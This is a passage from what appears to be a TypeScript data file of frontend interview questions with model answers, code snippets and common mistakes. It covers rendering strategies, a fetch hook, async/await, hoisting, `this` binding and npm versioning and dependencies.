        "CSR ships JS and renders in the browser (best for app-like, auth'd UI). SSR renders per request on the server (best for personalized, fresh content). SSG pre-renders at build time (best for marketing/blogs). ISR adds incremental revalidation on top of SSG.",
      answer: `Four common strategies, each trading freshness for cost and TTFB for HTML readiness:

- **CSR** (Client-Side Rendering) — server returns a near-empty HTML shell; JS hydrates and renders. Pros: simple infra, app-like UX. Cons: slow LCP, bad SEO without extra effort.
- **SSR** (Server-Side Rendering, per request) — server renders to HTML on every request. Pros: fast meaningful paint, fresh data, SEO-friendly. Cons: server cost, slower TTFB than static, requires running infra.
- **SSG** (Static Site Generation, build time) — render once at build, serve from CDN. Pros: cheap, instant TTFB, infinitely scalable. Cons: data is build-time stale; rebuild cost grows with page count.
- **ISR / Revalidation** — SSG + a stale-while-revalidate window. Best of both for content that changes occasionally (blogs, product pages).

Decision heuristic:
- **Marketing / docs / blog** → SSG (or ISR if frequent updates).
- **E-commerce product page** → ISR (cheap, mostly fresh).
- **Logged-in dashboard** → CSR for the app shell + server-data per route. RSCs (React Server Components) blur the lines further.
- **Personalized SSR** → only when SEO + per-user freshness both matter (e.g., logged-in homepage that's also indexed).

Modern Next.js / Remix lets you pick per route. Don't pick one strategy for the whole app — pick per page based on what that page actually needs.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Next.js App Router — three strategies in one app",
          code: `// app/blog/page.tsx — SSG (default for static data)
export default async function Blog() {
  const posts = await getPosts(); // build-time
  return <List posts={posts} />;
}

// app/product/[id]/page.tsx — ISR
export const revalidate = 60; // seconds

// app/feed/page.tsx — SSR (per-request)
export const dynamic = "force-dynamic";`,
        },
      ],
      followUps: [
        "How do React Server Components change the SSR vs CSR conversation?",
        "What's the cost model of SSR at scale and how do you cap it?",
        "When does PPR (Partial Prerendering) make sense?",
      ],
      commonMistakes: [
        "Using CSR for content pages and tanking SEO + LCP.",
        "Using SSR everywhere and paying for compute on pages that could be static.",
        "Treating ISR cache as fresh — there's always a stale window.",
      ],
      performanceConsiderations: [
        "SSG/ISR served from CDN edge ≈ <50ms TTFB. SSR is bound by your origin region.",
        "CSR's LCP is gated by JS download + parse + render — every KB matters.",
      ],
      edgeCases: [
        "Cookies/personalization break CDN caching — opt out with `cache: 'no-store'` or per-user keys.",
        "ISR's stale window can show outdated data for that first request after invalidation; design copy that tolerates it.",
      ],
      realWorldExamples: [
        "Vercel/Next docs: SSG. Linear web app: CSR shell + RSC for data. Amazon product page: ISR-like edge cache + SSR for personalized blocks.",
      ],
      seniorDiscussion:
        "Senior signal: discuss the cache hierarchy (browser, edge, ISR, ORM), per-route cost modeling, RSC streaming, and partial prerendering as the future hybrid.",
      relatedSlugs: ["how-do-you-optimize-core-web-vitals"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 15,
    },
  },

  {
    title: "Build a custom hook for fetch with loading, error, success states",
    aliases: [
      "custom hook loading error success",
      "useFetch hook",
      "build a custom hook",
      "hook for handling loading, error, and success states",
    ],
    question: {
      id: "build-a-custom-fetch-hook",
      slug: "build-a-custom-fetch-hook",
      title: "Build a custom hook that handles loading, error, and success states",
      category: "react",
      subcategory: "Hooks",
      tags: ["custom-hooks", "data-fetching", "abortcontroller", "react"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "A correct fetch hook tracks {status, data, error}, cancels in-flight requests on unmount or arg change with AbortController, and avoids stale-state-after-unmount warnings. The reducer pattern keeps transitions safe.",
      answer: `The "naïve useFetch" interview answer ships three classic bugs: it sets state after unmount, it doesn't cancel the previous request when the URL changes, and it spreads three booleans (\`loading\`, \`error\`, \`data\`) that can disagree (e.g. loading=true while data is also set).

A solid hook fixes all three:

1. **Single state machine** via \`useReducer\` so transitions are atomic.
2. **AbortController** scoped to each effect, aborted in cleanup.
3. **Effect deps** include the URL (and a \`refreshKey\` if you want manual refresh).

Senior nuance: in production you'd use React Query / SWR instead — they add caching, deduping, retries, focus revalidation, and SSR hydration. Build this hook to demonstrate the mechanics; recommend the library for actual code.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "useFetch — cancellation-aware, reducer-based",
          code: `type State<T> =
  | { status: "idle" }
  | { status: "loading" }
  | { status: "success"; data: T }
  | { status: "error"; error: Error };

type Action<T> =
  | { type: "start" }
  | { type: "ok"; data: T }
  | { type: "err"; error: Error };

function reducer<T>(_: State<T>, a: Action<T>): State<T> {
  switch (a.type) {
    case "start": return { status: "loading" };
    case "ok":    return { status: "success", data: a.data };
    case "err":   return { status: "error",   error: a.error };
  }
}

export function useFetch<T>(url: string) {
  const [state, dispatch] = useReducer(reducer<T>, { status: "idle" });

  useEffect(() => {
    const ctrl = new AbortController();
    dispatch({ type: "start" });
    fetch(url, { signal: ctrl.signal })
      .then(async (r) => {
        if (!r.ok) throw new Error(\`HTTP \${r.status}\`);
        return (await r.json()) as T;
      })
      .then((data) => dispatch({ type: "ok", data }))
      .catch((e) => {
        if (e.name === "AbortError") return; // expected on cleanup
        dispatch({ type: "err", error: e });
      });

    return () => ctrl.abort();
  }, [url]);

  return state;
}`,
        },
      ],
      followUps: [
        "How does this compare to React Query? What does it not handle?",
        "How do you add retry-with-exponential-backoff?",
        "How would you extend this to support optimistic updates?",
      ],
      commonMistakes: [
        "Three booleans (loading/error/data) instead of a tagged union — they disagree.",
        "Forgetting AbortController — the previous request can resolve after the new one and overwrite fresh data.",
        "Setting state after unmount and chasing the React warning instead of cleaning up.",
      ],
      performanceConsiderations: [
        "Without dedupe, two components fetching the same URL fire two requests — React Query / SWR de-dupe by key.",
      ],
      edgeCases: [
        "AbortError is an expected error — must be filtered, not surfaced to the UI.",
        "Strict Mode double-invokes the effect in dev; ensure cleanup truly aborts.",
      ],
      realWorldExamples: [
        "TanStack Query implements this same state machine plus cache, dedupe, refocus revalidation, and SSR hydration.",
      ],
      seniorDiscussion:
        "Senior signal: discuss why a custom hook is rarely the right answer in production, what 'data fetching primitives' libraries solve (cache key, structural sharing, retry, focus, mutate), and the new use() + Suspense data-fetching model.",
      relatedSlugs: ["react-lazy-and-suspense"],
      companyTags: [],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 25,
    },
  },

  {
    title: "How is async/await different from promises",
    aliases: ["async await vs promises", "async await different from promises", "async-await internally"],
    question: {
      id: "async-await-vs-promises",
      slug: "async-await-vs-promises",
      title: "How is async/await different from promises (and how does it work internally)?",
      category: "javascript",
      subcategory: "Async",
      tags: ["async-await", "promises", "generators", "microtasks"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "async/await is syntax sugar over promises and generators. `await` pauses the function, yields to the microtask queue, and resumes when the promise settles. Same semantics, dramatically better readability and error handling.",
      answer: `\`async\`/\`await\` is **syntactic sugar over promises**. It doesn't replace them or add a new asynchrony primitive — it gives you a more readable way to write code that consumes promises sequentially, and it makes \`try\`/\`catch\` work the way developers intuitively expect. Internally, an \`async\` function compiles to a state machine over a \`.then\` chain. Understanding the relationship (what \`await\` is sugar *for*) is the staff-level signal.

**The contract:**

1. **An \`async\` function always returns a Promise.** Even if its body is \`async function foo() { return 1; }\`, the return value is \`Promise.resolve(1)\`. Throwing inside an async function returns a rejected promise.
2. **\`await\` unwraps a promise.** When the engine hits \`await promise\`, it:
   - If \`promise\` is not a thenable, wraps it in \`Promise.resolve(value)\`.
   - Registers a \`.then\` continuation pointing back to the rest of the async function.
   - Returns control to the caller (the async function's invocation immediately returns a pending promise).
   - When the awaited promise settles, the continuation is scheduled as a **microtask**. Code after \`await\` runs in that microtask — never synchronously, **even when the promise is already resolved**.
3. **Errors propagate via promise rejection**, which is translated to a thrown exception inside the async body. So \`try { await x } catch (e) { ... }\` actually works, where \`.then(...).catch(...)\` would have required a separate handler.

**Equivalent forms:**

\`\`\`ts
async function fetchUser(id: string) {
  const res = await fetch(\\\`/api/users/\\\${id}\\\`);
  if (!res.ok) throw new Error('not found');
  const user = await res.json();
  return user;
}

// Equivalent promise chain:
function fetchUser(id: string) {
  return fetch(\\\`/api/users/\\\${id}\\\`)
    .then(res => { if (!res.ok) throw new Error('not found'); return res.json(); })
    .then(user => user);
}
\`\`\`

Same semantics — same microtask scheduling, same error propagation. The differences are entirely ergonomic: \`async\`/\`await\` reads top-down, debugger step-over works naturally, locals stay in scope, conditional flow doesn't fragment across thens.

**How it actually compiles (the staff-level part).** TC39 specifies an async function as a generator-like state machine. Roughly:

\`\`\`js
// async function foo() { const a = await p; return a + 1; }
function foo() {
  return new Promise((resolve, reject) => {
    let state = 0;
    let a;
    function step(value) {
      try {
        switch (state) {
          case 0:
            state = 1;
            return p.then(step, reject);
          case 1:
            a = value;
            resolve(a + 1);
        }
      } catch (e) { reject(e); }
    }
    step();
  });
}
\`\`\`

Each \`await\` is a yield point; the runtime captures the local frame, registers a \`.then\` continuation, and resumes via a microtask. Babel/SWC's lowered output looks just like this for older targets.

**Why \`await\` always defers to the microtask queue, even for resolved promises.** Specified behavior: \`await Promise.resolve(1)\` causes the rest of the function to run *one microtask later*. Code outside the function sees the promise as pending until the next microtask drain. This is occasionally surprising but ensures consistent ordering across resolved/unresolved cases.

**When raw promises still beat \`async\`/\`await\`:**

- **Parallelism.** This is the most common bug. Sequential awaits run serially: \`const a = await getA(); const b = await getB();\` waits 2x. If they're independent, use \`Promise.all([getA(), getB()])\` for parallel — both kick off before either awaits.
- **Fire-and-forget.** If you don't need the result, don't await; just call the function. \`async\` makes implicit not-awaiting visually quiet — a linter rule (\`no-floating-promises\`) catches accidental forgets.
- **Composition.** \`Promise.race\`, \`Promise.any\`, \`Promise.allSettled\` are clearer than loops with awaits for fan-out + reduce patterns.
- **Mid-chain transforms.** \`.then(parse).then(validate).then(store)\` reads as a pipeline; awaits with locals read as imperative.
- **Top-level outside modules.** Top-level \`await\` exists but only in ES modules; in script contexts you need an IIFE.

**Common bugs:**

- **Forgotten \`await\`.** Returns a Promise where a value was expected. \`if (await isAdmin(user))\` vs \`if (isAdmin(user))\` — the second is always truthy because Promises are objects.
- **Serial awaits when parallel was intended.** \`for (const id of ids) { await fetchOne(id); }\` is sequential. Either \`Promise.all(ids.map(fetchOne))\`, or use \`for await\` only when you mean serial.
- **Try/catch swallowing.** Forgetting to re-throw or to translate the caught error into a meaningful response.
- **Unhandled rejection** when you fire async work without awaiting and without catching — modern Node logs and may eventually exit.

**\`for await ... of\`** is the async-iteration form, useful for async generators and streaming responses (\`for await (const chunk of response.body)\`).

**Interview summary.** "\`async\`/\`await\` is sugar over \`.then\`/\`.catch\`. An async function returns a Promise; \`await\` unwraps a Promise and yields to the microtask queue. Internals are a generator state machine. The big gotcha is sequential awaits on independent work — use \`Promise.all\` for parallelism."`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Sequential vs parallel — common interview gotcha",
          code: `// Slow: sequential, total = a + b
const x = await a();
const y = await b();

// Fast: parallel, total = max(a, b)
const [x, y] = await Promise.all([a(), b()]);`,
        },
        {
          language: "ts",
          caption: "Errors compose with try/catch",
          code: `async function run() {
  try {
    const data = await fetchUser();
    return await save(data);
  } catch (err) {
    console.error("step failed:", err);
    throw err;     // bubble to caller
  } finally {
    spinner.stop(); // always runs
  }
}`,
        },
      ],
      followUps: [
        "What does an async function return if you don't return anything explicitly?",
        "Show how await schedules a microtask — what's the output of a mixed setTimeout + await example?",
        "Why does `await` inside a forEach not behave like you expect?",
      ],
      commonMistakes: [
        "Sequentially awaiting independent promises and tanking latency.",
        "Putting `await` inside `forEach` — forEach ignores the returned promise; sequence is lost.",
        "Forgetting `await` and getting a `Promise<X>` instead of `X`.",
      ],
      performanceConsiderations: [
        "Each `await` schedules a microtask — millions of awaits in a hot loop have measurable overhead.",
      ],
      edgeCases: [
        "`await` on a non-promise value still yields one microtask (it's wrapped in `Promise.resolve`).",
        "A throw inside an async function rejects the returned promise; outside callers must `.catch` or `await` to handle it.",
      ],
      realWorldExamples: [
        "ORMs and SDKs prefer async/await in their docs because the call sites read like synchronous code while remaining non-blocking.",
      ],
      seniorDiscussion:
        "Senior signal: explain the desugaring to a generator + driver, microtask scheduling implications, and structured concurrency patterns (AbortController scoping, parallel fan-out).",
      relatedSlugs: ["promise-all-vs-allsettled-vs-race", "how-does-the-event-loop-prioritize-microtasks-vs-macrotasks"],
      companyTags: [],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 12,
    },
  },

  {
    title: "Hoisting in JavaScript — var, let, const, functions, classes",
    aliases: ["hoisting javascript", "var hoisting", "function hoisting class hoisting"],
    question: {
      id: "hoisting-in-javascript",
      slug: "hoisting-in-javascript",
      title: "Hoisting in JavaScript — what gets hoisted and how",
      category: "javascript",
      subcategory: "Variables & Hoisting",
      tags: ["hoisting", "var", "let", "const", "tdz", "functions"],
      difficulty: "easy",
      frequency: "very-high",
      seniority: "junior",
      shortDescription:
        "Function declarations are fully hoisted (callable before the line). `var` is hoisted and initialized to undefined. `let`/`const`/`class` are hoisted but uninitialized — accessing them before the declaration throws (Temporal Dead Zone).",
      answer: `"Hoisting" is the casual word for a precise spec behavior: when JavaScript enters a scope (a function body, a module, the global scope), it processes every declaration *before* it runs any code, creating bindings for them in the scope's environment record. What people call "the variable was hoisted to the top" is really "the binding existed from the start of the scope, but its initialization happens later." The interesting question is not *if* something is hoisted but **when it becomes initialized**, and that depends entirely on the declaration kind.

**The table of behaviors:**

| Declaration | Binding hoisted? | Initialized at top? | Pre-line access |
|---|---|---|---|
| \`function foo() {}\` | yes | **yes — the function itself** | works |
| \`var x = 1\` | yes | yes (to \`undefined\`) | returns \`undefined\` |
| \`let x = 1\` | yes | **no** | ReferenceError (TDZ) |
| \`const x = 1\` | yes | no | ReferenceError (TDZ) |
| \`class A {}\` | yes | no | ReferenceError (TDZ) |
| \`function* gen()\`, \`async function fn()\` | yes | yes | works |

**Function declarations** (\`function foo() {}\`) are fully hoisted: both the binding and its function value are available from the top of the enclosing function/module. You can call \`foo()\` on line 1 and define it on line 100.

**\`var\` declarations** are hoisted and *initialized to \`undefined\`*. This is the source of the classic "why does \`console.log(x)\` log \`undefined\` and not \`ReferenceError\`?" — the binding exists, just isn't assigned yet.

\`\`\`js
console.log(x);  // undefined
var x = 5;
console.log(x);  // 5
\`\`\`

\`var\` is also **function-scoped**, not block-scoped. It "leaks" out of \`if\`/\`for\` blocks, which is the cause of the classic loop-closure bug.

**\`let\` and \`const\` declarations** are hoisted but **not initialized**. From the start of the block until the line of declaration, the binding is in the **Temporal Dead Zone (TDZ)**. Any access — read or write — throws \`ReferenceError\`. The TDZ exists deliberately to catch typos and out-of-order references that \`var\` silently swallowed.

\`\`\`js
console.log(y);   // ReferenceError: Cannot access 'y' before initialization
let y = 5;
\`\`\`

\`let\` and \`const\` are **block-scoped** — they die at the closing \`}\` of the block they're in, which is also what makes them safe for \`for (let i = 0; ...)\` loop bodies (each iteration gets its own binding).

**\`class\` declarations** behave like \`let\` for hoisting: the binding is created at the start of the scope, but the class is not initialized until the line. Accessing before the line is a TDZ error.

**Function expressions and arrow functions are NOT hoisted as functions.** Only the binding is, and only if it's a \`var\`/\`let\`/\`const\`.

\`\`\`js
bar();              // TypeError: bar is not a function
var bar = () => 1;  // 'bar' exists (undefined) but isn't a function yet
\`\`\`

If it were \`let bar = ...\`, the call would be a TDZ ReferenceError instead.

**The exact output question** that file 4 asks:

\`\`\`js
a = 10;
console.log(a);  // 10
var a;
\`\`\`

Walkthrough: \`var a\` is hoisted, so binding \`a\` exists from the top of the scope, initialized to \`undefined\`. Line 1 assigns \`10\`. Line 2 logs \`10\`. The \`var a\` on line 3 doesn't re-declare or reset; it's already been processed in the hoisting pass.

**Why TDZ exists.** Before \`let\`/\`const\` (ES5), pre-line access of a \`var\` returned \`undefined\`, which made typos like \`if (userName === undefined)\` silently pass when the variable was declared later. \`let\`/\`const\` flip this to a runtime error, surfacing the bug early. It also enables temporal initialization patterns like \`const config = computeConfig(); const derived = config.x;\` to safely guarantee order.

**Hoisting vs scope chain — not the same thing.** Hoisting is about *when* a binding becomes usable within a single scope; scope chain is about *which* scope a free variable resolves against (lexical scoping). They interact (a hoisted binding shadows a free variable from an outer scope), but they're separate mechanisms.

**Practical guidance:**

- Prefer \`const\`. Use \`let\` when reassignment is genuinely needed. Never use \`var\` in new code.
- Don't rely on function-declaration hoisting for ordering; put dependencies near their use.
- Top-of-file imports satisfy "declare before use" automatically.

**Interview-ready summary.** "Every declaration is hoisted as a binding; what differs is initialization. \`function\` declarations are initialized immediately. \`var\` is initialized to \`undefined\`. \`let\`/\`const\`/\`class\` are in the Temporal Dead Zone until their line — accessing them before throws ReferenceError. The TDZ is intentional; it catches a class of bugs \`var\` silently allowed."`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Different declarations, different behavior",
          code: `foo();           // "hi" — function declaration is fully hoisted
function foo() { console.log("hi"); }

console.log(a);  // undefined — var is hoisted, not initialized
var a = 1;

console.log(b);  // ReferenceError — TDZ
let b = 2;

new C();         // ReferenceError — TDZ for class
class C {}`,
        },
      ],
      followUps: [
        "What happens in `typeof` on a variable in TDZ?",
        "Why does redeclaring `var` succeed but redeclaring `let` throw?",
        "How does hoisting interact with default function-parameter values?",
      ],
      commonMistakes: [
        "Believing `let` and `const` aren't hoisted — they are; only initialization is delayed.",
        "Using a function before its `const` binding and getting `not a function`.",
        "Assuming class declarations are hoisted like function declarations.",
      ],
      performanceConsiderations: [
        "Hoisting has zero runtime cost — it's a parser/scope-setup phase, not a runtime move.",
      ],
      edgeCases: [
        "`typeof` on a TDZ binding throws (unlike on a never-declared identifier, which returns 'undefined').",
        "Function declarations inside blocks have inconsistent hoisting across engines in non-strict mode — avoid them.",
      ],
      realWorldExamples: [
        "ESLint's `no-use-before-define` codifies hoisting hygiene across modern codebases.",
      ],
      seniorDiscussion:
        "Senior signal: discuss two-pass parsing, the difference between *creation* and *initialization* phases of a Lexical Environment, and why function-declaration block-hoisting differs between strict and sloppy mode.",
      relatedSlugs: ["var-vs-let-vs-const"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 8,
    },
  },

  {
    title: "What is the output of console.log(this)?",
    aliases: ["console.log this", "this in different contexts"],
    question: {
      id: "value-of-this-in-different-contexts",
      slug: "value-of-this-in-different-contexts",
      title: "What is the value of `this` in different contexts?",
      category: "javascript",
      subcategory: "this & Binding",
      tags: ["this", "global", "strict-mode", "modules", "browsers", "node"],
      difficulty: "easy",
      frequency: "high",
      seniority: "junior",
      shortDescription:
        "Top-level `this` in a script is the global object (`window` in browsers, `globalThis` in Node sloppy). In ES modules and strict mode it's `undefined`. Inside functions, it depends on how they're called; arrows inherit lexically.",
      answer: `\`this\` is the single most context-sensitive value in JavaScript, and "what does \`this\` print?" output questions are an interview favorite specifically because there are *eight* distinct rules and most candidates can only recall three. The safest mental model is **"who called me, and how?"** — not "where am I written?" — with one critical exception: arrow functions, which capture \`this\` lexically at definition time.

**The rules, by context:**

**1. Top-level in a browser \`<script>\` (non-module).** \`this === window\`. The script body runs in the global execution context.

**2. Top-level in a browser \`<script type="module">\`.** \`this === undefined\`. ES modules are *strict* by default, and the spec deliberately removed top-level \`this\` from modules so that module code can't accidentally leak into globals.

**3. Top-level in Node CommonJS (\`.js\` with \`require\`).** \`this === module.exports\`, which is an empty object at startup. This is one of the most-asked output puzzles for the Node interview because it surprises people who expect \`global\`.

**4. Top-level in Node ES Module (\`.mjs\` or \`"type": "module"\`).** \`this === undefined\` — same as browser modules.

**5. Inside a regular function called bare (\`fn()\`).** Default binding: \`undefined\` in strict mode (and inside ES modules); the global object (\`window\` / \`global\` / \`globalThis\`) in sloppy mode. This is the source of "I extracted a method to a variable and lost \`this\`" bugs.

**6. Inside a method called as \`obj.fn()\`.** Implicit binding: \`this === obj\`. Crucially, the binding is determined by the *call expression*, not the function reference. \`const f = obj.fn; f()\` loses the binding because the dot is gone.

**7. Inside a constructor called with \`new Foo()\`.** \`new\` binding: \`this\` is the freshly created object whose internal \`[[Prototype]]\` points at \`Foo.prototype\`. Highest priority — overrides any earlier \`bind\`.

**8. Inside an arrow function.** Lexical: arrows have no \`this\` of their own; lookup falls through to the enclosing function's \`this\` at the moment the arrow was *defined*. \`call\`/\`apply\`/\`bind\` cannot change an arrow's \`this\`.

**9. Inside a class method.** Same as regular method when called via the instance; lost if detached. Static methods' \`this\` is the class itself, not an instance.

**10. Inside an event handler.** \`element.addEventListener('click', function() { /* this === element */ })\` — the dispatching element. With an arrow handler, \`this\` is the surrounding scope's. Same for inline \`onclick="this.style..."\` — \`this\` is the element.

**11. Inside callbacks to \`forEach\`/\`map\`/\`filter\` etc.** Default binding (so \`undefined\` in strict). \`Array.prototype.forEach\` accepts an optional second \`thisArg\` parameter that explicitly sets \`this\` inside the callback. Same for \`map\`, \`some\`, \`every\`, \`find\`.

**12. With explicit \`call\` / \`apply\` / \`bind\`.** Whatever you pass in. \`bind\` is one-shot and persistent; \`call\`/\`apply\` are for that single invocation. Higher priority than implicit but lower than \`new\`.

**13. Inside \`setTimeout\`/\`setInterval\` callback** with a regular function: default binding (so \`undefined\` strict / global sloppy). With an arrow: the enclosing \`this\`. This is why timer callbacks in classes often use arrows or explicit bind.

**File 4's specific output question: \`console.log(this)\` at top level.**

- In **a browser DevTools console**: the implementation-defined global, usually \`Window\`.
- In **a \`<script>\` tag in the browser**: \`Window\`.
- In **a Node REPL**: a special object (\`global\` in old versions, \`Object [global]\` summary).
- In a **\`.js\` file run by Node** (CommonJS): \`{}\` (it's \`module.exports\`).
- In a **\`.mjs\` file run by Node** (ESM): \`undefined\`.

The interviewer is usually probing the *Node vs browser* distinction. The high-value answer is: "In Node CommonJS, top-level \`this\` is \`module.exports\`, which is empty; in a browser script it's \`window\`; in any module it's \`undefined\`."

**Common output puzzles:**

\`\`\`js
const obj = {
  name: 'A',
  arrow: () => this.name,
  regular() { return this.name; }
};
obj.arrow();    // undefined (arrow's this is the module's, not obj)
obj.regular(); // 'A'

const f = obj.regular;
f();            // undefined / TypeError (lost this)
\`\`\`

**Strict-mode strictness matters.** ES modules and \`'use strict'\` make default \`this\` \`undefined\` instead of \`globalThis\`. This catches bugs early but breaks legacy snippets pasted in from sloppy contexts.

**Common mistakes:**

- Using an arrow function as an object method when \`this\` should refer to the object.
- Detaching a method into a variable and calling it bare.
- Forgetting that callbacks (forEach, setTimeout, event handlers) reset \`this\` for regular functions.
- Conflating \`this\` (call-site dependent) with closure variables (lexical).

**Senior signal:** name the eight contexts, recognize the Node CommonJS module.exports trick, and articulate that arrows are the *only* function form whose \`this\` is lexical.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Same code, different this depending on context",
          code: `// In a browser <script type="module">
console.log(this); // undefined (modules)

// In a browser <script>
console.log(this); // Window

// In Node CommonJS file
console.log(this); // {} === module.exports

(function () { console.log(this); })();        // undefined (strict) | global (sloppy)
({ x: 1, f() { console.log(this); } }).f();    // { x: 1 }
const arrow = () => console.log(this);          // inherits enclosing this`,
        },
      ],
      followUps: [
        "Why is module-level `this` undefined?",
        "How does the new globalThis differ across environments?",
        "What's `this` inside a setTimeout callback?",
      ],
      commonMistakes: [
        "Pasting code from one context into another and being surprised it broke.",
        "Using arrow functions as object methods.",
        "Forgetting that detaching a method (`const f = obj.fn`) loses `this`.",
      ],
      performanceConsiderations: [
        "There is no perf cost to `this` itself; the cost is mistakes (extra binds, creating new functions in render).",
      ],
      edgeCases: [
        "`this` inside a tagged template literal is the function's own `this`, not the template's.",
        "`new Function('return this')()` returns globalThis even inside a strict module — because it's a Function constructor.",
      ],
      realWorldExamples: [
        "Linters like `no-invalid-this` warn when `this` is read in a context where it's almost certainly a bug.",
      ],
      seniorDiscussion:
        "Senior signal: explain `globalThis` as a unifier, why module `this` is undefined, and how Function constructors differ from regular functions for `this`.",
      relatedSlugs: ["explain-this-call-apply-bind"],
      companyTags: [],
      estimatedReadingMinutes: 5,
      estimatedSolvingMinutes: 8,
    },
  },

  {
    title: "Caret (^) vs tilde (~) in package.json",
    aliases: ["caret tilde package.json", "package.json version range"],
    question: {
      id: "caret-vs-tilde-package-json",
      slug: "caret-vs-tilde-package-json",
      title: "Caret (^) vs tilde (~) in package.json — what do they mean?",
      category: "frontend",
      subcategory: "Tooling",
      tags: ["npm", "package.json", "semver", "versioning"],
      difficulty: "easy",
      frequency: "high",
      seniority: "junior",
      shortDescription:
        "`^1.2.3` allows any 1.x.x ≥ 1.2.3 (compatible-with-1.2.3). `~1.2.3` allows any 1.2.x ≥ 1.2.3 (patch only). Both stop at the next significant boundary; the difference is whether minors are allowed.",
      answer: `npm uses **semver** for version ranges. The leading symbol controls how loose the range is.

| Range | Allows | Locks |
|---|---|---|
| \`1.2.3\` | exactly that | major, minor, patch |
| \`~1.2.3\` | \`>=1.2.3 <1.3.0\` | major, minor |
| \`^1.2.3\` | \`>=1.2.3 <2.0.0\` | major |
| \`^0.2.3\` | \`>=0.2.3 <0.3.0\` (special!) | major + minor (because 0.x is unstable) |
| \`*\` | anything | nothing |

\`^\` is the npm default and the right starting point for most dependencies — semver promises no breaking changes within a major. \`~\` is stricter: only patches. Use it for libraries with shaky minor bumps or for tightly-coupled internal packages.

Beyond \`^\` and \`~\`, the **lockfile** (\`package-lock.json\` / \`yarn.lock\` / \`pnpm-lock.yaml\`) is what actually pins exact versions across installs. Without a lockfile, \`^1.2.3\` could resolve to a different version on each \`npm install\`, which is what causes "works on my machine" version drift.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Effective ranges",
          code: `// "^1.2.3"  -> 1.2.3, 1.5.0, 1.99.99    NOT 2.0.0
// "~1.2.3"  -> 1.2.3, 1.2.9                NOT 1.3.0
// "^0.2.3"  -> 0.2.3, 0.2.99               NOT 0.3.0   (0.x is special)
// "1.2.3"   -> only 1.2.3
// ">=1.2.3" -> any version >=1.2.3 (no upper bound — risky)`,
        },
      ],
      followUps: [
        "What's the role of package-lock.json given that ranges are loose?",
        "How does pnpm or Yarn Berry change the dependency-resolution model?",
        "What does `npm ci` do differently from `npm install`?",
      ],
      commonMistakes: [
        "Committing without a lockfile and getting different installs on CI vs dev.",
        "Believing `^0.x.y` allows any 0.x — it's restricted to the same minor.",
        "Trusting semver to be perfectly honored — many libraries break minor bumps in practice.",
      ],
      performanceConsiderations: [
        "Lockfiles speed installs by skipping resolution — `npm ci` is faster than `npm install` for CI.",
      ],
      edgeCases: [
        "Pre-releases (`1.2.3-beta.1`) are excluded from `^`/`~` unless you opt in with `--include=prerelease`.",
        "Workspaces (monorepos) often pin internal packages to `workspace:*` instead of semver.",
      ],
      realWorldExamples: [
        "Most boilerplates use `^` so dependencies pick up bug fixes; security-critical projects sometimes pin exact versions instead.",
      ],
      seniorDiscussion:
        "Senior signal: discuss how lockfiles, peer deps, hoisting, and dedupe interact, and the case for exact pinning + Renovate / Dependabot vs. range-based.",
      relatedSlugs: [],
      companyTags: [],
      estimatedReadingMinutes: 4,
      estimatedSolvingMinutes: 6,
    },
  },

  {
    title: "What are dev dependencies in package.json?",
    aliases: ["devdependencies", "dev dependencies package.json"],
    question: {
      id: "devdependencies-in-package-json",
      slug: "devdependencies-in-package-json",
      title: "What are devDependencies, and how are they different from dependencies?",
      category: "frontend",
      subcategory: "Tooling",
      tags: ["npm", "package.json", "dependencies", "devdependencies"],
      difficulty: "easy",
      frequency: "high",
      seniority: "junior",
      shortDescription:
        "`dependencies` are needed at runtime; `devDependencies` are only needed for building, testing, or linting. Consumers of your package install dependencies but skip devDependencies.",
      answer: `\`package.json\` splits packages into buckets that affect what gets installed where:

- **\`dependencies\`** — needed when the code actually runs (React, lodash, your DB driver).
- **\`devDependencies\`** — only needed at dev time (TypeScript, ESLint, Jest, Vite).
- **\`peerDependencies\`** — packages the consumer must provide (e.g., a React component library declares \`react\` as a peer so it shares the host's React).
- **\`optionalDependencies\`** — installs are best-effort; failures don't break install.

Why the split matters:

1. **Library consumers.** When your package is installed as a dependency by someone else, npm installs your \`dependencies\` but **not** your \`devDependencies\`. Putting Jest in \`dependencies\` would force every consumer to download Jest.
2. **Production installs.** \`npm ci --omit=dev\` (or \`NODE_ENV=production npm install\` historically) skips dev deps, shrinking Docker images significantly.
3. **Dependency hygiene.** Treating dev tooling as separate makes audits easier — a CVE in your bundler doesn't ship to prod runtimes.

For an *application* (not a library), the split matters less for the consumer (there is none), but it still affects production install size and CI.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Typical split for a Next.js app",
          code: `{
  "dependencies": {
    "next": "^14",
    "react": "^18",
    "react-dom": "^18"
  },
  "devDependencies": {
    "typescript": "^5",
    "eslint": "^8",
    "@types/react": "^18",
    "vitest": "^1"
  }
}`,
        },
        {
          language: "ts",
          caption: "Skip dev deps in a production install",
          code: `# in CI / Dockerfile
npm ci --omit=dev`,
        },
      ],
      followUps: [
        "Why are @types/* packages typically devDependencies?",
        "What's a peerDependency, and how does it differ from devDependencies?",
        "What does `npm install --save-dev X` do?",
      ],
      commonMistakes: [
        "Putting test tooling in `dependencies` and bloating consumers' installs.",
        "Putting actual runtime libs in `devDependencies` and breaking production at startup.",
        "Forgetting `peerDependencies` for a component library, leading to duplicate React copies.",
      ],
      performanceConsiderations: [
        "Production-only installs cut Docker layer size and image cold-start times — significant in serverless.",
      ],
      edgeCases: [
        "Build-only deps (e.g. `tailwindcss`) belong in `devDependencies` for libraries but `dependencies` if a Next.js app needs them at *runtime* build (depends on platform).",
        "Some hosting (e.g. Vercel) installs all deps regardless and runs build there — dev/runtime split still affects the runtime layer.",
      ],
      realWorldExamples: [
        "Most React component libraries declare React as a peerDependency and put it in devDependencies for local development.",
      ],
      seniorDiscussion:
        "Senior signal: discuss peer-dep ranges, dependency hoisting in monorepos (pnpm strict vs npm flat), and how lockfile + omit=dev shape image security posture.",
